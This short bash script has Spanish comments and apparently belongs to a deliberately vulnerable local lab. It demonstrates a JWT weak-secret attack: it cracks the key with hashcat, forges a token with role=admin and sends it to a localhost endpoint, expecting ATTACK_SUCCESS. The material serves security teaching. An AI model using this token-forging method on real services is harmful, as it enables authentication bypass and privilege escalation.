#!/bin/bash
echo "=== JWT Partial (clave débil): Bypass con token crackeado ==="
echo ""
echo "Paso 1: La clave del servidor es 'weak-secret-key-please-change-me'"
echo "Un atacante la crackea con: hashcat -m 16500 <token> wordlist.txt"
echo ""
echo "Paso 2: Obtenemos un token reforjado con esa clave y role=admin:"
FORGED=$(curl -s http://localhost:8080/api/auth/forge-weak-key/2 | python -c "import sys,json; print(json.load(sys.stdin)['forgedToken'])")

echo "Token forjado: ${FORGED:0:60}..."
echo ""
echo "Paso 3: Enviamos el token al estado partial-weak-key:"
curl -s -H "X-Auth-Token: $FORGED" \
  http://localhost:8080/api/jwt/partial-weak-key/profile | python -m json.tool

echo ""
echo "Resultado esperado: ATTACK_SUCCESS (firma válida con clave débil, role=admin aceptado)"
